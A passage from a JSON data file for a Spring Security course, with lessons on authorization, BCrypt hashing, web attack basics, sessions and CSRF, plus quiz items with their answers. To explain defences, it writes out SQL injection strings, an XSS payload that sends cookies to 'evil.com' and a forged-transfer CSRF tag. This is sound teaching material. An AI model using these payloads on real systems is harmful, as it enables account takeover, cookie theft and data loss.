              "content": "Secure individual methods:\n\nEnable in SecurityConfig:\n\n@Configuration\n@EnableWebSecurity\n@EnableMethodSecurity  // Enable method-level security\npublic class SecurityConfig {\n    // ...\n}\n\nUse in controllers/services:\n\n@RestController\n@RequestMapping(\"/api/users\")\npublic class UserController {\n    \n    @GetMapping\n    @PreAuthorize(\"hasRole('USER')\")  // Requires USER role\n    public List<User> getAllUsers() {\n        return userService.findAll();\n    }\n    \n    @DeleteMapping(\"/{id}\")\n    @PreAuthorize(\"hasRole('ADMIN')\")  // Requires ADMIN role\n    public void deleteUser(@PathVariable Long id) {\n        userService.delete(id);\n    }\n    \n    @GetMapping(\"/me\")\n    @PreAuthorize(\"isAuthenticated()\")  // Any logged-in user\n    public User getCurrentUser() {\n        return userService.getCurrentUser();\n    }\n}\n\nEXPRESSIONS:\n- hasRole('ROLE'): Has specific role\n- hasAnyRole('ROLE1', 'ROLE2'): Has any of these roles\n- isAuthenticated(): Logged in\n- permitAll(): Anyone can access"
            },
            {
              "type": "THEORY",
              "title": "Getting the Current User",
              "content": "Access authenticated user in controllers:\n\nMETHOD 1: Principal parameter\n\n@GetMapping(\"/profile\")\npublic String getProfile(Principal principal) {\n    String username = principal.getName();\n    return \"Logged in as: \" + username;\n}\n\nMETHOD 2: Authentication parameter\n\n@GetMapping(\"/profile\")\npublic String getProfile(Authentication authentication) {\n    String username = authentication.getName();\n    Collection<? extends GrantedAuthority> authorities = \n        authentication.getAuthorities();\n    return \"User: \" + username + \", Roles: \" + authorities;\n}\n\nMETHOD 3: SecurityContextHolder (anywhere in code)\n\nAuthentication auth = SecurityContextHolder.getContext().getAuthentication();\nString username = auth.getName();\nboolean isAdmin = auth.getAuthorities().stream()\n    .anyMatch(a -> a.getAuthority().equals(\"ROLE_ADMIN\"));\n\nSpring injects the current authenticated user automatically!"
            },
            {
              "type": "THEORY",
              "title": "⚠️ Password Security - Never Store Plain Passwords!",
              "content": "❌ TERRIBLE - Plain passwords:\n\nusers table:\n| id | username | password    |\n|----|----------|-------------|\n| 1  | alice    | password123 |  ← ANYONE CAN READ THIS!\n| 2  | bob      | secret456   |  ← DATABASE BREACH = DISASTER\n\n✓ CORRECT - Hashed passwords:\n\nusers table:\n| id | username | password                                                   |\n|----|----------|---------------------------------------------------------|\n| 1  | alice    | $2a$10$abcd1234...xyz789 |  ← Hashed, can't reverse\n| 2  | bob      | $2a$10$wxyz9876...abc123 |  ← Even if stolen, useless\n\nUse BCryptPasswordEncoder:\n\n@Service\npublic class UserService {\n    @Autowired\n    private PasswordEncoder passwordEncoder;\n    \n    public User registerUser(String username, String plainPassword) {\n        User user = new User();\n        user.setUsername(username);\n        \n        // Hash password before saving\n        String hashedPassword = passwordEncoder.encode(plainPassword);\n        user.setPassword(hashedPassword);\n        \n        return userRepository.save(user);\n    }\n}\n\nBCrypt:\n- One-way hash (can't reverse)\n- Salted (same password = different hash)\n- Slow on purpose (prevents brute force)\n- Industry standard"
            },
            {
              "type": "THEORY",
              "title": "💻 Complete Security Configuration",
              "content": "```java\nSecurityConfig.java:\n\n@Configuration\n@EnableWebSecurity\n@EnableMethodSecurity\npublic class SecurityConfig {\n    \n    @Bean\n    public SecurityFilterChain securityFilterChain(HttpSecurity http) \n            throws Exception {\n        http\n            .csrf(csrf -> csrf.disable())  // Disable for REST APIs\n            .authorizeHttpRequests(auth -> auth\n                // Public endpoints\n                .requestMatchers(\"/api/auth/**\").permitAll()\n                .requestMatchers(\"/api/public/**\").permitAll()\n                \n                // User endpoints\n                .requestMatchers(\"/api/users/**\").hasAnyRole(\"USER\", \"ADMIN\")\n                \n                // Admin endpoints\n                .requestMatchers(\"/api/admin/**\").hasRole(\"ADMIN\")\n                \n                // All other requests need authentication\n                .anyRequest().authenticated()\n            )\n            .httpBasic(Customizer.withDefaults())  // Enable HTTP Basic\n            .sessionManagement(session -> session\n                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)\n            );  // Stateless for REST APIs\n        \n        return http.build();\n    }\n    \n    @Bean\n    public PasswordEncoder passwordEncoder() {\n        return new BCryptPasswordEncoder();\n    }\n}\n\nThis configuration:\n✓ Allows public access to /api/auth/** and /api/public/**\n✓ Requires USER or ADMIN role for /api/users/**\n✓ Requires ADMIN role for /api/admin/**\n✓ Uses BCrypt for password hashing\n✓ Stateless sessions (REST API pattern)\n```"
            },
            {
              "type": "KEY_POINT",
              "title": "⚠️ HTTP Basic Auth vs JWT - Production Considerations",
              "content": "HTTP BASIC AUTH (Used in this lesson):\n✓ Simple to implement and understand\n✓ Good for learning and internal tools\n✓ Works with testing tools (Postman, curl)\n\n❌ SECURITY LIMITATIONS:\n- Credentials sent with EVERY request (Base64 encoded, NOT encrypted!)\n- Must ALWAYS use HTTPS in production - without it, credentials are exposed!\n- No built-in token expiration\n- Hard to implement features like 'remember me' or token refresh\n\nPRODUCTION STANDARD - JWT (JSON Web Tokens):\n✓ Token-based: Login once, get token, use token for subsequent requests\n✓ Stateless: Server doesn't store sessions\n✓ Expiration: Tokens auto-expire (e.g., after 1 hour)\n✓ Claims: Can embed user info in token (roles, permissions)\n✓ Industry standard for REST APIs and microservices\n\nOAUTH2 / OpenID Connect:\n✓ For 'Login with Google/GitHub' features\n✓ Delegated authentication to trusted providers\n✓ Required for third-party API access\n\nRECOMMENDATION:\nUse HTTP Basic for:\n- Learning projects\n- Internal admin tools (behind VPN)\n- Simple prototypes\n\nUse JWT for:\n- Production APIs\n- Mobile apps\n- Single Page Applications (React, Angular)\n- Microservices\n\nSpring Security supports all options - we use Basic Auth here for simplicity, but migrate to JWT for production!"
            }
          ],
          "challenges": []
        }
      ],
      "order": 11
    },
    {
      "id": "module-security",
      "title": "Security: Sessions & JWT",
      "description": "Master web application security from fundamentals through Spring Security, session-based authentication, JWT tokens, and role-based access control.",
      "difficulty": "advanced",
      "estimatedHours": 3.25,
      "lessons": [
        {
          "id": "security-lesson-1",
          "title": "Lesson S.1: Web Security Fundamentals",
          "moduleId": "module-security",
          "order": 1,
          "estimatedMinutes": 35,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Your App is Under Attack",
              "content": "The moment you deploy a web application, you become a target:\n\nREAL STATISTICS (2024):\n- 30,000+ websites hacked DAILY\n- Average data breach cost: $4.45 million\n- 43% of attacks target small businesses\n- 60% of breached companies close within 6 months\n\nCommon attack scenarios:\n\n1. CREDENTIAL STUFFING:\nAttacker uses leaked username/password pairs from other breaches.\nResult: Unauthorized access to user accounts.\n\n2. SESSION HIJACKING:\nAttacker steals session cookie.\nResult: Impersonates logged-in user without knowing password.\n\n3. SQL INJECTION:\nAttacker enters: ' OR '1'='1' -- in login form.\nResult: Bypasses authentication entirely.\n\n4. CROSS-SITE SCRIPTING (XSS):\nAttacker injects malicious JavaScript.\nResult: Steals cookies, redirects users, defaces site.\n\nSecurity isn't optional - it's survival."
            },
            {
              "type": "KEY_POINT",
              "title": "Authentication vs Authorization",
              "content": "These terms are often confused but are fundamentally different:\n\nAUTHENTICATION (AuthN):\n- WHO are you?\n- Proving identity\n- Login process\n- Examples: username/password, fingerprint, OAuth\n\nAUTHORIZATION (AuthZ):\n- WHAT can you do?\n- Checking permissions\n- After authentication\n- Examples: admin vs user roles, read vs write access\n\nReal-world analogy:\n\nAUTHENTICATION: Showing your ID at the airport.\n'Yes, you are John Smith.'\n\nAUTHORIZATION: Checking your boarding pass.\n'John Smith can board Flight 123, seat 14A.'\n\nBoth are required for secure applications:\n1. First, verify WHO the user is (authentication)\n2. Then, determine WHAT they can access (authorization)"
            },
            {
              "type": "THEORY",
              "title": "OWASP Top 10: Critical Security Risks",
              "content": "OWASP (Open Web Application Security Project) tracks the most critical risks:\n\n1. BROKEN ACCESS CONTROL (A01:2021)\n- Users access unauthorized functions/data\n- Example: Changing URL from /user/profile to /admin/panel\n\n2. CRYPTOGRAPHIC FAILURES (A02:2021)\n- Weak encryption, exposed sensitive data\n- Example: Storing passwords in plain text\n\n3. INJECTION (A03:2021)\n- SQL, NoSQL, OS command injection\n- Example: SELECT * FROM users WHERE id = '1; DROP TABLE users;--'\n\n4. INSECURE DESIGN (A04:2021)\n- Missing security controls by design\n- Example: No rate limiting on login attempts\n\n5. SECURITY MISCONFIGURATION (A05:2021)\n- Default credentials, unnecessary features enabled\n- Example: Debug mode left on in production\n\n6. VULNERABLE COMPONENTS (A06:2021)\n- Using libraries with known vulnerabilities\n- Example: Log4j vulnerability (CVE-2021-44228)\n\n7. AUTHENTICATION FAILURES (A07:2021)\n- Weak passwords, session fixation\n- Example: Allowing 'password123'\n\n8. DATA INTEGRITY FAILURES (A08:2021)\n- Untrusted deserialization, CI/CD compromise\n\n9. LOGGING FAILURES (A09:2021)\n- Not detecting breaches due to poor logging\n\n10. SSRF (A10:2021)\n- Server-side request forgery"
            },
            {
              "type": "KEY_POINT",
              "title": "Defense in Depth",
              "content": "Security isn't one thing - it's LAYERS:\n\nLAYER 1: NETWORK\n- Firewalls, HTTPS, WAF (Web Application Firewall)\n- Block attacks before they reach your app\n\nLAYER 2: APPLICATION\n- Input validation, output encoding\n- Spring Security, authentication/authorization\n\nLAYER 3: DATA\n- Encryption at rest and in transit\n- Password hashing (bcrypt, Argon2)\n- Secure database access\n\nLAYER 4: MONITORING\n- Audit logs, intrusion detection\n- Alert on suspicious activity\n\nWHY LAYERS?\nIf one layer fails, others still protect you.\n\nExample: Attacker bypasses firewall\n-> Application validates input (blocked)\n-> Even if that fails, data is encrypted\n-> Even if accessed, monitoring detects it\n\nNo single control is perfect. Layers compensate for individual failures."
            },
            {
              "type": "THEORY",
              "title": "Common Attack Patterns",
              "content": "Understanding attacks helps you defend:\n\nSQL INJECTION:\n// Vulnerable\nString query = \"SELECT * FROM users WHERE name = '\" + userInput + \"'\";\n// Input: ' OR '1'='1' --\n// Result: SELECT * FROM users WHERE name = '' OR '1'='1' --'\n// Returns ALL users!\n\nFIX: Use parameterized queries\nPreparedStatement ps = conn.prepareStatement(\n    \"SELECT * FROM users WHERE name = ?\");\nps.setString(1, userInput);  // Safely escaped\n\nCROSS-SITE SCRIPTING (XSS):\n// Vulnerable\n<p>Welcome, ${username}</p>\n// Input: <script>document.location='evil.com?c='+document.cookie</script>\n// Result: Steals cookies!\n\nFIX: Encode output\n<p>Welcome, ${fn:escapeXml(username)}</p>\n\nCROSS-SITE REQUEST FORGERY (CSRF):\n// Attacker's site has:\n<img src=\"https://yourbank.com/transfer?to=attacker&amount=10000\">\n// Victim's browser sends request with their cookies!\n\nFIX: CSRF tokens (covered in session lesson)"
            },
            {
              "type": "WARNING",
              "title": "Security Mindset",
              "content": "NEVER trust user input. EVER.\n\nEverything from the client is potentially malicious:\n- Form fields\n- URL parameters\n- HTTP headers\n- Cookies\n- File uploads\n\nValidate on the SERVER, not just client-side:\n\n// Client validation (easily bypassed)\n<input type=\"email\" required>  // Attacker ignores this\n\n// Server validation (required)\nif (!isValidEmail(email)) {\n    throw new ValidationException(\"Invalid email\");\n}\n\nPrinciple of LEAST PRIVILEGE:\n- Give minimum permissions needed\n- Admin access only when required\n- Time-limited elevated access\n\nFAIL SECURELY:\n- On error, deny access (not grant)\n- Don't expose error details to users\n- Log security events for investigation"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "security-lesson-1-mc-1",
              "title": "Authentication vs Authorization",
              "description": "Understanding the difference between AuthN and AuthZ",
              "question": "A user logs into an e-commerce site and tries to access the admin dashboard. The system shows 'Access Denied - Administrators Only'. Which security control denied the request?",
              "options": [
                "Authentication - the user's identity couldn't be verified",
                "Authorization - the user lacks permission for that resource",
                "Encryption - the request wasn't properly secured",
                "Input validation - the URL was malformed"
              ],
              "correctAnswer": 1,
              "explanation": "The user successfully logged in (authentication passed), but lacks admin permissions (authorization failed). Authentication verifies WHO you are; authorization determines WHAT you can access. Here, the user is authenticated but not authorized for the admin dashboard.",
              "difficulty": "intermediate"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "security-lesson-1-mc-2",
              "title": "OWASP Top 10",
              "description": "Identifying common security vulnerabilities",
              "question": "A developer writes: String query = \"SELECT * FROM products WHERE id = \" + productId; where productId comes from a URL parameter. What OWASP category does this vulnerability belong to?",
              "options": [
                "A01 - Broken Access Control",
                "A02 - Cryptographic Failures",
                "A03 - Injection",
                "A07 - Authentication Failures"
              ],
              "correctAnswer": 2,
              "explanation": "This is SQL Injection (A03 - Injection). User input is directly concatenated into a SQL query without sanitization. An attacker could input '1 OR 1=1' to bypass filters or '1; DROP TABLE products;--' to delete data. The fix is parameterized queries: PreparedStatement with '?' placeholders.",
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "security-lesson-2",
          "title": "Lesson S.2: Spring Security Basics",
          "moduleId": "module-security",
          "order": 2,
          "estimatedMinutes": 40,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "Why Spring Security?",
              "content": "You COULD implement security yourself:\n\n// DIY Authentication (DON'T DO THIS)\n@PostMapping(\"/login\")\npublic String login(String username, String password) {\n    User user = userRepo.findByUsername(username);\n    if (user != null && user.getPassword().equals(password)) {\n        session.setAttribute(\"user\", user);\n        return \"redirect:/dashboard\";\n    }\n    return \"redirect:/login?error\";\n}\n\nPROBLEMS:\n- Plain text password comparison\n- No brute force protection\n- No session fixation protection\n- No CSRF protection\n- No remember-me functionality\n- No logout handling\n- No concurrent session control\n\nSpring Security provides ALL of this out of the box:\n- Battle-tested by millions of applications\n- Updated for new vulnerabilities\n- Integrates with Spring ecosystem\n- Extensible for custom requirements\n\nDon't reinvent the wheel. Security is too important to get wrong."
            },
            {
              "type": "KEY_POINT",
              "title": "The Security Filter Chain",
              "content": "Spring Security works through a chain of filters:\n\nHTTP Request\n    |\n    v\n[SecurityFilterChain]\n    |\n    +-> SecurityContextPersistenceFilter (load security context)\n    +-> LogoutFilter (handle /logout)\n    +-> UsernamePasswordAuthenticationFilter (form login)\n    +-> BasicAuthenticationFilter (HTTP Basic)\n    +-> RequestCacheAwareFilter (saved request)\n    +-> SecurityContextHolderFilter\n    +-> SessionManagementFilter\n    +-> ExceptionTranslationFilter (handle auth exceptions)\n    +-> FilterSecurityInterceptor (authorization check)\n    |\n    v\nYour Controller\n\nEach filter has a specific responsibility:\n- Early filters: Extract credentials\n- Middle filters: Authenticate user\n- Late filters: Authorize request\n\nFilters can:\n- Pass request to next filter\n- Short-circuit (deny request)\n- Modify request/response\n\nYou configure WHAT to protect and HOW. Spring Security handles the rest."
            },
            {
              "type": "THEORY",
              "title": "Adding Spring Security",
              "content": "Add the dependency:\n\n<!-- Maven -->\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-security</artifactId>\n</dependency>\n\nWith ZERO configuration, Spring Security:\n- Requires authentication for ALL endpoints\n- Generates a random password (check console logs)\n- Provides /login and /logout pages\n- Enables CSRF protection\n- Adds security headers\n\nConsole output:\nUsing generated security password: 8f3a7b2c-4d5e-6f7g-8h9i-0j1k2l3m4n5o\n\nDefault username: user\n\nThis is intentionally strict. You customize from a secure baseline rather than adding security later."
            },
            {
              "type": "EXAMPLE",
              "title": "Basic Security Configuration",
              "content": "Customize security with SecurityFilterChain:",
              "code": "import org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\nimport org.springframework.security.core.userdetails.User;\nimport org.springframework.security.core.userdetails.UserDetailsService;\nimport org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;\nimport org.springframework.security.crypto.password.PasswordEncoder;\nimport org.springframework.security.provisioning.InMemoryUserDetailsManager;\nimport org.springframework.security.web.SecurityFilterChain;\n\n@Configuration\n@EnableWebSecurity\npublic class SecurityConfig {\n\n    @Bean\n    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {\n        return http\n            // Define URL authorization rules\n            .authorizeHttpRequests(auth -> auth\n                // Public endpoints - no auth required\n                .requestMatchers(\"/\", \"/home\", \"/public/**\").permitAll()\n                .requestMatchers(\"/css/**\", \"/js/**\", \"/images/**\").permitAll()\n                // Admin endpoints - ADMIN role required\n                .requestMatchers(\"/admin/**\").hasRole(\"ADMIN\")\n                // API endpoints - authenticated users only\n                .requestMatchers(\"/api/**\").authenticated()\n                // Everything else - authenticated\n                .anyRequest().authenticated()\n            )\n            // Enable form-based login\n            .formLogin(form -> form\n                .loginPage(\"/login\")        // Custom login page\n                .defaultSuccessUrl(\"/dashboard\", true)\n                .permitAll()\n            )\n            // Enable logout\n            .logout(logout -> logout\n                .logoutSuccessUrl(\"/login?logout\")\n                .permitAll()\n            )\n            .build();\n    }\n\n    @Bean\n    public UserDetailsService userDetailsService() {\n        // In-memory users for demo (use database in production!)\n        var user = User.builder()\n            .username(\"user\")\n            .password(passwordEncoder().encode(\"password\"))\n            .roles(\"USER\")\n            .build();\n\n        var admin = User.builder()\n            .username(\"admin\")\n            .password(passwordEncoder().encode(\"admin123\"))\n            .roles(\"USER\", \"ADMIN\")\n            .build();\n\n        return new InMemoryUserDetailsManager(user, admin);\n    }\n\n    @Bean\n    public PasswordEncoder passwordEncoder() {\n        return new BCryptPasswordEncoder();\n    }\n}",
              "language": "java"
            },
            {
              "type": "KEY_POINT",
              "title": "Authorization Matchers",
              "content": "Spring Security 6 uses requestMatchers() with various matching strategies:\n\nBY PATH:\n.requestMatchers(\"/admin/**\")           // /admin/anything\n.requestMatchers(\"/api/users/{id}\")     // Path variable\n.requestMatchers(\"/public\", \"/home\")   // Multiple paths\n\nBY HTTP METHOD:\n.requestMatchers(HttpMethod.GET, \"/api/**\")    // GET only\n.requestMatchers(HttpMethod.POST, \"/api/**\")   // POST only\n.requestMatchers(HttpMethod.DELETE, \"/admin/**\") // DELETE only\n\nAUTHORIZATION RULES:\n.permitAll()              // No authentication required\n.authenticated()          // Must be logged in\n.hasRole(\"ADMIN\")         // Must have ADMIN role\n.hasAnyRole(\"ADMIN\", \"MANAGER\")  // Any of these roles\n.hasAuthority(\"WRITE_PERMISSION\") // Specific authority\n.denyAll()                // Never allow\n\nORDER MATTERS!\nRules are evaluated top to bottom. First match wins.\n\n// WRONG - /admin/public is protected!\n.requestMatchers(\"/admin/**\").hasRole(\"ADMIN\")\n.requestMatchers(\"/admin/public\").permitAll()\n\n// RIGHT - specific rule first\n.requestMatchers(\"/admin/public\").permitAll()\n.requestMatchers(\"/admin/**\").hasRole(\"ADMIN\")"
            },
            {
              "type": "WARNING",
              "title": "Spring Security 6 Migration Notes",
              "content": "If you see old tutorials, note these Spring Security 6 changes:\n\nOLD (Spring Security 5.x):\n@EnableWebSecurity\npublic class SecurityConfig extends WebSecurityConfigurerAdapter {\n    @Override\n    protected void configure(HttpSecurity http) {\n        http.authorizeRequests()\n            .antMatchers(\"/admin/**\").hasRole(\"ADMIN\")\n    }\n}\n\nNEW (Spring Security 6.x):\n@Configuration\n@EnableWebSecurity\npublic class SecurityConfig {\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) {\n        return http\n            .authorizeHttpRequests(auth -> auth\n                .requestMatchers(\"/admin/**\").hasRole(\"ADMIN\")\n            )\n            .build();\n    }\n}\n\nKEY CHANGES:\n- No more extending WebSecurityConfigurerAdapter (deprecated)\n- authorizeRequests() -> authorizeHttpRequests()\n- antMatchers() -> requestMatchers()\n- Method returns SecurityFilterChain bean\n- Lambda DSL is the standard"
            },
            {
              "type": "THEORY",
              "title": "Password Encoding",
              "content": "NEVER store passwords in plain text:\n\n// CATASTROPHICALLY WRONG\nuser.setPassword(rawPassword);  // Stored as-is\n\n// If database is breached, all passwords exposed!\n\nALWAYS hash passwords:\n\n@Bean\npublic PasswordEncoder passwordEncoder() {\n    return new BCryptPasswordEncoder();\n}\n\n// Registration\nString hashedPassword = passwordEncoder.encode(rawPassword);\nuser.setPassword(hashedPassword);\n// Stored: $2a$10$N9qo8uLOickgx2ZMRZoMy...\n\n// Login - Spring Security handles this automatically!\n// It compares: encoder.matches(rawPassword, storedHash)\n\nWHY BCrypt?\n- Intentionally slow (prevents brute force)\n- Built-in salt (prevents rainbow tables)\n- Adjustable cost factor\n- Industry standard\n\nBCrypt cost factor:\nnew BCryptPasswordEncoder(12)  // 2^12 iterations\n// Higher = more secure but slower\n// 10 is default, 12+ recommended for 2025"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "security-lesson-2-mc-1",
              "title": "Filter Chain Order",
              "description": "Understanding security rule evaluation",
              "question": "Given this configuration:\n.requestMatchers(\"/api/**\").authenticated()\n.requestMatchers(\"/api/public\").permitAll()\nWhat happens when an unauthenticated user accesses /api/public?",
              "options": [
                "Access granted - permitAll() applies",
                "Access denied - /api/** rule matches first",
                "Error - conflicting rules",
                "Redirected to login - needs authentication"
              ],
              "correctAnswer": 1,
              "explanation": "Authorization rules are evaluated top-to-bottom, first match wins. '/api/**' matches '/api/public' before the specific rule is reached. The request requires authentication. To allow public access, put the specific rule FIRST: .requestMatchers(\"/api/public\").permitAll() then .requestMatchers(\"/api/**\").authenticated()",
              "difficulty": "intermediate"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "security-lesson-2-mc-2",
              "title": "Password Storage",
              "description": "Understanding secure password practices",
              "question": "Why is BCrypt preferred over SHA-256 for password hashing?",
              "options": [
                "BCrypt produces longer hashes",
                "BCrypt is intentionally slow and includes salting",
                "BCrypt is newer and therefore better",
                "BCrypt uses symmetric encryption"
              ],
              "correctAnswer": 1,
              "explanation": "BCrypt is designed for passwords: it's intentionally slow (configurable work factor) to resist brute force, and includes automatic salting to prevent rainbow table attacks. SHA-256 is fast (good for data integrity, bad for passwords) and requires manual salt management. Speed is a liability for password hashing.",
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "security-lesson-3",
          "title": "Lesson S.3: Session-Based Authentication",
          "moduleId": "module-security",
          "order": 3,
          "estimatedMinutes": 40,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "How Sessions Work",
              "content": "HTTP is stateless - each request is independent. Sessions add state:\n\n1. USER LOGS IN:\nPOST /login\nBody: username=john&password=secret\n\n2. SERVER CREATES SESSION:\n- Validates credentials\n- Creates session object with unique ID\n- Stores user info in session (server-side)\n- Returns session ID in cookie\n\nSet-Cookie: JSESSIONID=ABC123; HttpOnly; Secure\n\n3. SUBSEQUENT REQUESTS:\nGET /dashboard\nCookie: JSESSIONID=ABC123\n\n4. SERVER LOOKS UP SESSION:\n- Finds session by ID\n- Retrieves stored user info\n- Knows who is making request\n\nKEY POINT: Session DATA is stored SERVER-SIDE.\nThe cookie only contains the session ID (a random string).\nClient never sees password, user details, or permissions."
            },
            {
              "type": "KEY_POINT",
              "title": "Session Security Concerns",
              "content": "Sessions have specific vulnerabilities:\n\nSESSION HIJACKING:\nIf attacker gets your session cookie, they become you.\n\nProtections:\n- HttpOnly: JavaScript can't read cookie\n- Secure: Cookie only sent over HTTPS\n- SameSite: Prevents cross-site cookie sending\n\nSet-Cookie: JSESSIONID=ABC123; HttpOnly; Secure; SameSite=Strict\n\nSESSION FIXATION:\nAttacker sets YOUR session ID before you log in,\nthen uses same ID after you authenticate.\n\nProtection: Generate NEW session ID on login.\n\nSpring Security does this automatically:\nhttp.sessionManagement(session -> session\n    .sessionFixation().changeSessionId()  // Default!\n)\n\nSESSION TIMEOUT:\nSessions should expire after inactivity.\n\napplication.properties:\nserver.servlet.session.timeout=30m  # 30 minutes"
            },
            {
              "type": "THEORY",
              "title": "Form Login with Spring Security",
              "content": "Spring Security's form login handles:\n- Login page generation (or custom)\n- Credential validation\n- Session creation\n- Remember-me (optional)\n- Login success/failure handling\n\n@Bean\npublic SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n    return http\n        .formLogin(form -> form\n            .loginPage(\"/login\")              // Custom login page\n            .loginProcessingUrl(\"/perform_login\")  // Form action URL\n            .usernameParameter(\"email\")       // Custom field name\n            .passwordParameter(\"pwd\")         // Custom field name\n            .defaultSuccessUrl(\"/dashboard\")  // After login\n            .failureUrl(\"/login?error=true\")  // On failure\n            .successHandler(customSuccessHandler)  // Custom logic\n            .failureHandler(customFailureHandler)\n            .permitAll()\n        )\n        .build();\n}\n\nCustom login page (Thymeleaf):\n<form th:action=\"@{/perform_login}\" method=\"post\">\n    <input type=\"text\" name=\"email\" placeholder=\"Email\">\n    <input type=\"password\" name=\"pwd\" placeholder=\"Password\">\n    <button type=\"submit\">Login</button>\n</form>"
            },
            {
              "type": "EXAMPLE",
              "title": "CSRF Protection",
              "content": "Cross-Site Request Forgery protection is CRITICAL for sessions:",
              "code": "// CSRF Attack scenario:\n// 1. User logs into yourbank.com\n// 2. User visits evil-site.com\n// 3. Evil site has:\n//    <img src=\"https://yourbank.com/transfer?to=attacker&amount=10000\">\n// 4. Browser sends request WITH user's session cookie!\n// 5. Bank processes transfer - user never clicked anything\n\n// CSRF TOKEN PROTECTION:\n// Spring Security generates unique token per session\n// Token must be included in state-changing requests\n// Attacker can't know the token!\n\n// Thymeleaf form (token added automatically):\n<form th:action=\"@{/transfer}\" method=\"post\">\n    <!-- Spring adds: <input type=\"hidden\" name=\"_csrf\" value=\"abc123\"> -->\n    <input type=\"text\" name=\"to\" placeholder=\"Recipient\">\n    <input type=\"number\" name=\"amount\" placeholder=\"Amount\">\n    <button type=\"submit\">Transfer</button>\n</form>\n\n// For AJAX requests, include token in header:\nconst csrfToken = document.querySelector('meta[name=\"_csrf\"]').content;\nconst csrfHeader = document.querySelector('meta[name=\"_csrf_header\"]').content;\n\nfetch('/api/transfer', {\n    method: 'POST',\n    headers: {\n        [csrfHeader]: csrfToken,  // X-CSRF-TOKEN: abc123\n        'Content-Type': 'application/json'\n    },\n    body: JSON.stringify({ to: 'recipient', amount: 100 })\n});\n\n// In HTML head:\n<meta name=\"_csrf\" th:content=\"${_csrf.token}\">\n<meta name=\"_csrf_header\" th:content=\"${_csrf.headerName}\">",
              "language": "java"
            },
            {
              "type": "KEY_POINT",
              "title": "Session Management Configuration",
              "content": "Control session behavior:\n\n@Bean\npublic SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n    return http\n        .sessionManagement(session -> session\n            // What to do with session ID on authentication\n            .sessionFixation().changeSessionId()  // Safest (default)\n            \n            // Concurrent session control\n            .maximumSessions(1)                   // Only 1 session per user\n            .maxSessionsPreventsLogin(true)       // Block new login\n            // OR .maxSessionsPreventsLogin(false) // Kick out old session\n            \n            // Session creation policy\n            .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)\n            // IF_REQUIRED: Create when needed (default)\n            // ALWAYS: Always create\n            // NEVER: Never create (but use if exists)\n            // STATELESS: Never create or use (for JWT)\n            \n            // Invalid session handling\n            .invalidSessionUrl(\"/login?expired\")\n        )\n        .build();\n}\n\nConcurrent session control prevents:\n- Account sharing\n- Session persistence after password change\n- Forgotten logins on public computers"
            },
            {
              "type": "THEORY",
              "title": "Sessions in Distributed Systems",
              "content": "Session storage becomes complex with multiple servers:\n\nPROBLEM:\nServer A creates session, stores in memory.\nLoad balancer sends next request to Server B.\nServer B doesn't have that session - user logged out!\n\nSOLUTIONS:\n\n1. STICKY SESSIONS:\nLoad balancer always sends user to same server.\nProblem: Server dies, sessions lost.\n\n2. SESSION REPLICATION:\nServers sync sessions with each other.\nProblem: Network overhead, complexity.\n\n3. CENTRALIZED SESSION STORE:\nAll servers use shared store (Redis, database).\nBest for most applications.\n\nSpring Session with Redis:\n\n<dependency>\n    <groupId>org.springframework.session</groupId>\n    <artifactId>spring-session-data-redis</artifactId>\n</dependency>\n\napplication.properties:\nspring.session.store-type=redis\nspring.redis.host=localhost\nspring.redis.port=6379\n\nNow sessions survive server restarts and work across instances.\n\n4. STATELESS (JWT):\nNo server-side session at all.\nCovered in next lesson!"
            },
            {
              "type": "WARNING",
              "title": "Session Security Checklist",
              "content": "Before deploying, verify:\n\n[] Cookie Flags:\n   - HttpOnly: Prevents XSS stealing cookies\n   - Secure: HTTPS only\n   - SameSite=Strict or Lax\n\napplication.properties:\nserver.servlet.session.cookie.http-only=true\nserver.servlet.session.cookie.secure=true\nserver.servlet.session.cookie.same-site=strict\n\n[] Session Timeout:\n   - Set appropriate timeout\n   - Balance security vs user experience\n\nserver.servlet.session.timeout=30m\n\n[] Session Fixation:\n   - Generate new ID on login (Spring default)\n\n[] Logout:\n   - Invalidate session completely\n   - Clear remember-me tokens\n\n.logout(logout -> logout\n    .logoutUrl(\"/logout\")\n    .invalidateHttpSession(true)\n    .clearAuthentication(true)\n    .deleteCookies(\"JSESSIONID\", \"remember-me\")\n)\n\n[] CSRF:\n   - Enabled for browser-based apps\n   - Token in forms and AJAX"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "security-lesson-3-mc-1",
              "title": "CSRF Protection",
              "description": "Understanding CSRF attacks and defenses",
              "question": "Why doesn't CSRF protection help against an attacker who has XSS (cross-site scripting) on your site?",
              "options": [
                "XSS can read the CSRF token from the page and include it in requests",
                "CSRF tokens expire too quickly for XSS to use",
                "XSS only works on static pages, not dynamic content",
                "CSRF protection encrypts tokens that XSS cannot decrypt"
              ],
              "correctAnswer": 0,
              "explanation": "XSS allows attackers to run JavaScript in your site's context. This JavaScript can read the CSRF token from the page (it's in the DOM) and include it in malicious requests. XSS completely bypasses CSRF protection - this is why preventing XSS is critical. Never trust user input in rendered HTML.",
              "difficulty": "intermediate"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "security-lesson-3-mc-2",
              "title": "Session Storage",
              "description": "Understanding session scalability",
